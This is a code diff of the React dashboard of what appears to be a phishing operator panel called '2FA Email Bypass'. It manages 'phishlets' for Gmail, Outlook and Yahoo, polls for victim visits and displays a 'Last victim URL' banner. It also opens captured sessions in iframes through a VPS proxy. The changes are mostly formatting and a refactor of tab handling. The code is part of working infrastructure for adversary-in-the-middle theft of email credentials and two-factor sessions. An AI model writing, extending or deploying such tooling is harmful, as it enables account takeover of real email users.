@@ -1,43 +1,48 @@
-import { useState, useEffect, useRef, useCallback } from 'react'
-import axios from 'axios'
-import Sidebar from './Sidebar'
-import TerminalOutput from './TerminalOutput'
-import useAsyncAction from '../hooks/useAsyncAction'
+import { useState, useEffect, useRef, useCallback } from "react";
+import axios from "axios";
+import Sidebar from "./Sidebar";
+import TerminalOutput from "./TerminalOutput";
+import useAsyncAction from "../hooks/useAsyncAction";
+import { getVpsIp, getRouterPort } from "../hooks/phishletUrl";
 
-const VPS_IP = import.meta.env.VITE_VPS_IP || '127.0.0.1'
-const BASE = import.meta.env.VITE_API_URL || ''
-const APP_NAME = import.meta.env.VITE_APP_NAME || '2FA Email Bypass'
+const VPS_IP = getVpsIp();
+const ROUTER_PORT = getRouterPort();
+const BASE = import.meta.env.VITE_API_URL || "";
+const APP_NAME = import.meta.env.VITE_APP_NAME || "2FA Email Bypass";
 
 function authHeaders() {
-  const token = localStorage.getItem('btb_token')
-  return token ? { Authorization: `Bearer ${token}` } : {}
+  const token = localStorage.getItem("btb_token");
+  return token ? { Authorization: `Bearer ${token}` } : {};
 }
 
-const PHISHLET_KEYS = ['gmail', 'outlook', 'yahoo']
+const PHISHLET_KEYS = ["gmail", "outlook", "yahoo"];
 
 function timeAgo(iso) {
-  if (!iso) return ''
-  const diff = Math.max(0, Math.floor((Date.now() - new Date(iso).getTime()) / 1000))
-  if (diff < 60) return `${diff}s ago`
-  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`
-  return `${Math.floor(diff / 3600)}h ago`
+  if (!iso) return "";
+  const diff = Math.max(
+    0,
+    Math.floor((Date.now() - new Date(iso).getTime()) / 1000),
+  );
+  if (diff < 60) return `${diff}s ago`;
+  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
+  return `${Math.floor(diff / 3600)}h ago`;
 }
 
-let tabIdCounter = 0
+let tabIdCounter = 0;
 
 export default function Dashboard() {
-  const { loading, logs, run, clearLogs } = useAsyncAction()
-  const [tabs, setTabs] = useState([])
-  const [activeTabId, setActiveTabId] = useState(null)
-  const [iframeError, setIframeError] = useState(false)
-  const [lastVisit, setLastVisit] = useState(null)
-  const [sidebarOpen, setSidebarOpen] = useState(false)
-  const iframeRef = useRef(null)
+  const { loading, logs, run, clearLogs } = useAsyncAction();
+  const [tabs, setTabs] = useState([]);
+  const [activeTabId, setActiveTabId] = useState(null);
+  const [iframeError, setIframeError] = useState(false);
+  const [lastVisit, setLastVisit] = useState(null);
+  const [sidebarOpen, setSidebarOpen] = useState(false);
+  const iframeRef = useRef(null);
 
   useEffect(() => {
-    let cancelled = false
+    let cancelled = false;
     async function poll() {
-      const candidates = []
+      const candidates = [];
       await Promise.all(
         PHISHLET_KEYS.map((key) =>
           axios
@@ -46,75 +51,84 @@ export default function Dashboard() {
               headers: authHeaders(),
             })
             .then((res) => {
-              const v = (res.data.visits || [])[0]
-              if (v) candidates.push({ key, ...v })
+              const v = (res.data.visits || [])[0];
+              if (v) candidates.push({ key, ...v });
             })
-            .catch(() => {})
-        )
-      )
-      if (cancelled) return
+            .catch(() => {}),
+        ),
+      );
+      if (cancelled) return;
       candidates.sort((a, b) => {
-        const ta = a.timestamp ? new Date(a.timestamp).getTime() : 0
-        const tb = b.timestamp ? new Date(b.timestamp).getTime() : 0
-        return tb - ta
-      })
-      setLastVisit(candidates[0] || null)
+        const ta = a.timestamp ? new Date(a.timestamp).getTime() : 0;
+        const tb = b.timestamp ? new Date(b.timestamp).getTime() : 0;
+        return tb - ta;
+      });
+      setLastVisit(candidates[0] || null);
     }
-    poll()
-    const t = setInterval(poll, 5000)
-    return () => { cancelled = true; clearInterval(t) }
-  }, [])
+    poll();
+    const t = setInterval(poll, 5000);
+    return () => {
+      cancelled = true;
+      clearInterval(t);
+    };
+  }, []);
 
   function addTab(url, label, phishletKey) {
-    setSidebarOpen(false)
-    const existing = tabs.find((t) => t.url === url)
+    setSidebarOpen(false);
+    const existing = tabs.find((t) => t.url === url);
     if (existing) {
-      setActiveTabId(existing.id)
-      setIframeError(false)
-      return
+      setActiveTabId(existing.id);
+      setIframeError(false);
+      return;
     }
-    const id = ++tabIdCounter
-    setTabs([...tabs, { id, url, label, key: phishletKey || null }])
-    setActiveTabId(id)
-    setIframeError(false)
+    const id = ++tabIdCounter;
+    setTabs([...tabs, { id, url, label, key: phishletKey || null }]);
+    setActiveTabId(id);
+    setIframeError(false);
   }
 
-  const closeTab = useCallback((id) => {
-    setTabs((prev) => {
-      const idx = prev.findIndex((t) => t.id === id)
-      const next = prev.filter((t) => t.id !== id)
-      if (activeTabId === id) {
-        if (next.length === 0) {
-          setActiveTabId(null)
-        } else if (idx > 0) {
-          setActiveTabId(next[idx - 1].id)
-        } else {
-          setActiveTabId(next[0].id)
+  const closeTab = useCallback(
+    (id) => {
+      setTabs((prev) => {
+        const idx = prev.findIndex((t) => t.id === id);
+        const next = prev.filter((t) => t.id !== id);
+        if (activeTabId === id) {
+          if (next.length === 0) {
+            setActiveTabId(null);
+          } else if (idx > 0) {
+            setActiveTabId(next[idx - 1].id);
+          } else {
+            setActiveTabId(next[0].id);
+          }
         }
-      }
-      return next
-    })
-  }, [activeTabId])
+        return next;
+      });
+    },
+    [activeTabId],
+  );
 
-  const closeTabsByPort = useCallback((port) => {
-    setTabs((prev) => {
-      const remaining = prev.filter((t) => !t.url.includes(`:${port}`))
-      if (remaining.length === 0) {
-        setActiveTabId(null)
-      } else if (!remaining.find((t) => t.id === activeTabId)) {
-        setActiveTabId(remaining[remaining.length - 1].id)
-      }
-      return remaining
-    })
-  }, [activeTabId])
+  const closeTabsByKey = useCallback(
+    (key) => {
+      setTabs((prev) => {
+        const remaining = prev.filter((t) => t.key !== key);
+        if (remaining.length === 0) {
+          setActiveTabId(null);
+        } else if (!remaining.find((t) => t.id === activeTabId)) {
+          setActiveTabId(remaining[remaining.length - 1].id);
+        }
+        return remaining;
+      });
+    },
+    [activeTabId],
+  );
 
   const updateTabUrl = useCallback((phishletKey, newUrl) => {
-    setTabs((prev) => prev.map((t) =>
-      t.key === phishletKey ? { ...t, url: newUrl } : t
-    ))
-  }, [])
+    setTabs((prev) =>
+      prev.map((t) => (t.key === phishletKey ? { ...t, url: newUrl } : t)),
+    );
+  }, []);
 
-  const activeTab = tabs.find((t) => t.id === activeTabId)
+  const activeTab = tabs.find((t) => t.id === activeTabId);
 
   return (
     <div className="min-h-screen bg-gray-950 flex">
@@ -125,16 +139,18 @@ export default function Dashboard() {
         />
       )}
 
-      <div className={`
+      <div
+        className={`
         fixed lg:static inset-y-0 left-0 z-50
         transform transition-transform duration-200 ease-in-out
-        ${sidebarOpen ? 'translate-x-0' : '-translate-x-full lg:translate-x-0'}
-      `}>
+        ${sidebarOpen ? "translate-x-0" : "-translate-x-full lg:translate-x-0"}
+      `}
+      >
         <Sidebar
           onRun={run}
           loading={loading}
           onOpenBrowser={addTab}
-          onContainerRemoved={closeTabsByPort}
+          onContainerRemovedByKey={closeTabsByKey}
           onPauseToggle={updateTabUrl}
           onClose={() => setSidebarOpen(false)}
         />
@@ -146,33 +162,44 @@ export default function Dashboard() {
             onClick={() => setSidebarOpen(true)}
             className="text-gray-400 hover:text-green-400 transition p-1"
           >
-            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
+            <svg
+              className="w-5 h-5"
+              fill="none"
+              stroke="currentColor"
+              viewBox="0 0 24 24"
+            >
+              <path
+                strokeLinecap="round"
+                strokeLinejoin="round"
+                strokeWidth={2}
+                d="M4 6h16M4 12h16M4 18h16"
+              />
             </svg>
           </button>
-          <span className="text-sm font-bold text-green-400 tracking-widest">{APP_NAME}</span>
+          <span className="text-sm font-bold text-green-400 tracking-widest">
+            {APP_NAME}
+          </span>
         </div>
 
         <div className="flex-1 p-3 sm:p-4 lg:p-6 overflow-y-auto">
-          <div className="text-xs text-gray-600 mb-4">
-            target: <span className="text-green-500">{VPS_IP}</span>
-          </div>
-
-          {lastVisit && lastVisit.timestamp && (Date.now() - new Date(lastVisit.timestamp).getTime() < 5 * 60 * 1000) && (
-            <div className="mb-4 border border-green-900 bg-green-950/40 rounded px-3 py-2 text-xs flex items-center gap-2">
-              <span className="text-green-400">🟢</span>
-              <span className="text-gray-400">Last victim URL:</span>
-              <span className="text-green-300 font-mono truncate max-w-[60%]">
-                {lastVisit.current_url}
-              </span>
-              <span className="text-gray-500 hidden sm:inline">
-                ({lastVisit.key}, {timeAgo(lastVisit.timestamp)})
-              </span>
-              <span className="text-gray-500 sm:hidden">
-                ({timeAgo(lastVisit.timestamp)})
-              </span>
-            </div>
-          )}
+          {lastVisit &&
+            lastVisit.timestamp &&
+            Date.now() - new Date(lastVisit.timestamp).getTime() <
+              5 * 60 * 1000 && (
+              <div className="mb-4 border border-green-900 bg-green-950/40 rounded px-3 py-2 text-xs flex items-center gap-2">
+                <span className="text-green-400">🟢</span>
+                <span className="text-gray-400">Last victim URL:</span>
+                <span className="text-green-300 font-mono truncate max-w-[60%]">
+                  {lastVisit.current_url}
+                </span>
+                <span className="text-gray-500 hidden sm:inline">
+                  ({lastVisit.key}, {timeAgo(lastVisit.timestamp)})
+                </span>
+                <span className="text-gray-500 sm:hidden">
+                  ({timeAgo(lastVisit.timestamp)})
+                </span>
+              </div>
+            )}
 
           <TerminalOutput logs={logs} onClear={clearLogs} />
 
@@ -182,16 +209,22 @@ export default function Dashboard() {
                 {tabs.map((tab) => (
                   <div
                     key={tab.id}
-                    onClick={() => { setActiveTabId(tab.id); setIframeError(false) }}
+                    onClick={() => {
+                      setActiveTabId(tab.id);
+                      setIframeError(false);
+                    }}
                     className={`flex items-center gap-1.5 px-3 py-2 text-xs cursor-pointer border-r border-gray-800 transition whitespace-nowrap shrink-0 ${
                       tab.id === activeTabId
-                        ? 'bg-gray-800 text-green-300'
-                        : 'text-gray-500 hover:text-gray-300 hover:bg-gray-850'
+                        ? "bg-gray-800 text-green-300"
+                        : "text-gray-500 hover:text-gray-300 hover:bg-gray-850"
                     }`}
                   >
                     <span>{tab.label}</span>
                     <button
-                      onClick={(e) => { e.stopPropagation(); closeTab(tab.id) }}
+                      onClick={(e) => {
+                        e.stopPropagation();
+                        closeTab(tab.id);
+                      }}
                       className="text-gray-600 hover:text-red-400 ml-1 leading-none"
                     >
                       ×
@@ -207,7 +240,10 @@ export default function Dashboard() {
                   open in new tab
                 </a>
                 <button
-                  onClick={() => { setTabs([]); setActiveTabId(null) }}
+                  onClick={() => {
+                    setTabs([]);
+                    setActiveTabId(null);
+                  }}
                   className="px-3 py-2 text-xs text-gray-500 hover:text-red-400 transition shrink-0"
                   title="Close browser"
                 >
@@ -218,9 +254,12 @@ export default function Dashboard() {
               {iframeError ? (
                 <div className="flex-1 flex items-center justify-center bg-gray-950 min-h-[300px] sm:min-h-[400px]">
                   <div className="text-center px-4">
-                    <p className="text-red-400 text-sm mb-2">Could not connect to {activeTab?.url}</p>
+                    <p className="text-red-400 text-sm mb-2">
+                      Could not connect to {activeTab?.url}
+                    </p>
                     <p className="text-gray-500 text-xs mb-4">
-                      Make sure the container is running and port is open on the VPS.
+                      Make sure the container is running and port is open on the
+                      VPS.
                     </p>
                     <a
                       href={activeTab?.url}
@@ -236,9 +275,16 @@ export default function Dashboard() {
                 <iframe
                   key={`${activeTabId}-${activeTab?.url}`}
                   ref={iframeRef}
-                  src={activeTab?.url && !activeTab.url.includes(`:${VPS_IP}:`) && !activeTab.url.includes(':580') && !activeTab.url.includes(':590')
-                    ? `${BASE}/api/proxy?url=${encodeURIComponent(activeTab.url)}`
-                    : activeTab?.url}
+                  src={
+                    activeTab?.url &&
+                    !activeTab.url.includes(`:${VPS_IP}:`) &&
+                    !activeTab.url.includes(":580") &&
+                    !activeTab.url.includes(":590") &&
+                    !activeTab.url.includes(`http://${VPS_IP}:${ROUTER_PORT}/`) &&
+                    !activeTab.url.includes(`http://${VPS_IP}/`)
+                      ? `${BASE}/api/proxy?url=${encodeURIComponent(activeTab.url)}`
+                      : activeTab?.url
+                  }
                   className="w-full flex-1 min-h-[300px] sm:min-h-[400px] bg-black"
                   title={activeTab?.label}
                   onError={() => setIframeError(true)}
@@ -249,5 +295,5 @@ export default function Dashboard() {
         </div>
       </main>
     </div>
-  )
+  );
 }
